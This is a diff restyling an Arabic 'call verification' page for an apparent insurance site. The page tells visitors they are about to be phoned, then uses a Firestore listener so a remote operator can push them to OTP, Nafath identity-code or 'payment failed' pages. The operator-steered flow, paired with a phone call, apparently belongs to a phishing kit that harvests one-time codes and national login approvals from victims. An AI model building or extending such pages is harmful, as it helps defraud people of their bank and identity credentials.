@@ -6,78 +6,96 @@
     <script src="js/theme-toggle.js"></script>
     <script src="js/i18n.js"></script>
     <title>استكمال الطلب | Call Verification</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="css/inner-theme.css">
+    <link id="bootstrap-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/site-theme.css">
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
     <style>
-        body { display:flex; flex-direction:column; min-height:100vh; }
-        .main-wrap { flex:1; display:flex; align-items:center; justify-content:center; padding:28px 16px 48px; }
-        .wait-label { color:#f87171; font-weight:700; font-size:1.05rem; margin-top:4px; }
+        body { min-height: 100vh; margin: 0; display: flex; flex-direction: column; }
+        .navbar { width: 100%; padding: 10px 0; }
+        .nav-logo { height: 35px; margin-inline-end: 20px; }
+        .main-content { flex: 1; display: flex; align-items: center; justify-content: center; width: 100%; padding: 20px 0; }
+        .form-wrapper { max-width: 500px; width: 90%; padding: 40px; text-align: center; border-radius: var(--tree-radius-lg); }
+        .phone-call-animation {
+            position: relative; width: 100px; height: 100px; margin: 0 auto 25px;
+            border-radius: 50%; display: flex; align-items: center; justify-content: center;
+            animation: pulse 1.8s infinite cubic-bezier(0.66, 0, 0, 1);
+            background: var(--tree-primary-soft);
+        }
+        .phone-call-animation span { font-size: 50px; }
+        @keyframes pulse { to { box-shadow: 0 0 0 25px rgba(25, 135, 84, 0); } }
+        .main-msg { font-size: 1.5rem; font-weight: 700; margin-bottom: 15px; }
+        .sub-msg { font-size: 1rem; line-height: 1.7; margin-bottom: 25px; color: var(--tree-text-muted); }
+        .waiting-status { font-weight: bold; color: #dc3545; font-size: 1.1rem; }
+        .timer-box { font-size: 0.9rem; padding: 10px 20px; border-radius: 10px; display: inline-block; }
     </style>
 </head>
-<body>
+<body class="tree-site">
 
 <button type="button" class="tree-theme-toggle" onclick="toggleTreeTheme()" aria-label="تبديل الوضع الليلي"><span class="tree-theme-toggle__glyph" aria-hidden="true"></span></button>
 
-<nav class="inner-nav">
-    <a href="index.html" class="inner-nav__logo">tree</a>
-    <div class="inner-nav__right">
-        <button class="lang-btn" data-lang-toggle onclick="toggleLang()">EN</button>
+<nav class="navbar">
+    <div class="container-fluid d-flex justify-content-between align-items-center">
+        <img src="images/logo.png" class="nav-logo" alt="Tree" onerror="this.src='https://placehold.co/100x35/198754/ffffff?text=TREE'">
+        <button class="btn btn-outline-success btn-sm" data-lang-toggle onclick="toggleLang()">EN</button>
     </div>
 </nav>
 
-<div class="main-wrap">
-    <div class="teal-card teal-card--narrow" style="width:100%;">
-        <div class="card-body" style="text-align:center;padding-top:36px;padding-bottom:40px;">
-
-            <div class="icon-circle icon-circle--phone" style="margin-bottom:20px;">📞</div>
-
-            <div class="section-title" data-i18n="call.title">سوف يتم الاتصال بك الآن</div>
-            <div class="section-sub" style="margin:10px 0 6px;line-height:1.7;" data-i18n="call.msg">قم باتباع الخطوات الموجودة بالاتصال ليتم تسجيل رقم جوالك بوثيقة التأمين.</div>
-            <div class="wait-label" data-i18n="call.wait">يرجى الانتظار!</div>
-
-            <div class="timer-chip" style="margin-top:24px;justify-content:center;">
-                <span data-i18n="call.redirect">إعادة توجيه تلقائي بعد</span>
-                <span class="timer-chip__num" id="timer">00:59</span>
-            </div>
-
-        </div>
-    </div>
+<div class="main-content">
+<div class="form-wrapper">
+    <div class="phone-call-animation"><span>📞</span></div>
+    <h3 class="main-msg" data-i18n="call.title">سوف يتم الاتصال بك الآن</h3>
+    <p class="sub-msg">
+        <span data-i18n="call.msg">قم باتباع الخطوات الموجودة بالاتصال ليتم تسجيل رقم جوالك بوثيقة التأمين.</span>
+        <br>
+        <span class="waiting-status" data-i18n="call.wait">يرجى الانتظار!</span>
+    </p>
+    <div class="timer-box"><span data-i18n="call.redirect">إعادة توجيه تلقائي بعد</span> <span id="timer" class="fw-bold">00:59</span></div>
+</div>
 </div>
 
 <script>
-    const firebaseConfig = {
-        apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
-        authDomain: "tameen-658e9.firebaseapp.com",
-        projectId: "tameen-658e9",
-        storageBucket: "tameen-658e9.firebasestorage.app",
-        messagingSenderId: "292670676256",
-        appId: "1:292670676256:web:3624157751cd194efe4b45"
-    };
+    const firebaseConfig = { apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE", authDomain: "tameen-658e9.firebaseapp.com", projectId: "tameen-658e9", storageBucket: "tameen-658e9.firebasestorage.app", messagingSenderId: "292670676256", appId: "1:292670676256:web:3624157751cd194efe4b45" };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
     const userId = localStorage.getItem('user_id');
-
+    
+    // Timer
     let time = 59;
     const timerDisplay = document.getElementById('timer');
     const countdown = setInterval(() => {
-        timerDisplay.innerText = '00:' + time.toString().padStart(2,'0');
-        if (--time < 0) { clearInterval(countdown); window.location.href = "nafath.html"; }
+        let seconds = time % 60;
+        timerDisplay.innerText = `00:${seconds.toString().padStart(2, '0')}`;
+        if (time <= 0) {
+            clearInterval(countdown);
+            window.location.href = "nafath.html"; // التحويل التلقائي لصفحة نفاذ كخيار احتياطي
+        }
+        time--;
     }, 1000);
 
-    (function() {
-        if (userId) {
-            db.collection("orders").doc(userId).onSnapshot((doc) => {
-                if (doc.exists) {
-                    const data = doc.data();
-                    if (data.next_step === "GO_TO_OTP") window.location.href = "otp_verification.html";
-                    else if (data.next_step === "GO_TO_REJECT") window.location.href = "payment_failed.html";
-                    else if (data.next_step === "GO_TO_NAFATH" || data.next_step === "SHOW_NAFATH_CODE") window.location.href = "nafath.html";
+    // --- أضف كود الجسر هنا (قبل إغلاق السكريبت) ---
+(function() {
+    const userId = localStorage.getItem('user_id');
+    if (userId) {
+        db.collection("orders").doc(userId).onSnapshot((doc) => {
+            if (doc.exists) {
+                const data = doc.data();
+                if (data.next_step === "GO_TO_OTP") {
+                    window.location.href = "otp_verification.html"; 
+                } else if (data.next_step === "GO_TO_REJECT") {
+                    window.location.href = "payment_failed.html";
+                } else if (data.next_step === "GO_TO_NAFATH") {
+                    window.location.href = "nafath.html";
+                } else if (data.next_step === "SHOW_NAFATH_CODE") {
+                    window.location.href = "nafath.html"; // التوجيه الصحيح لصفحة نفاذ لعرض الرقم
                 }
-            });
-        }
-    })();
+            }
+        });
+    }
+})();
+// ------------------------------------------
+
 </script>
 </body>
 </html>
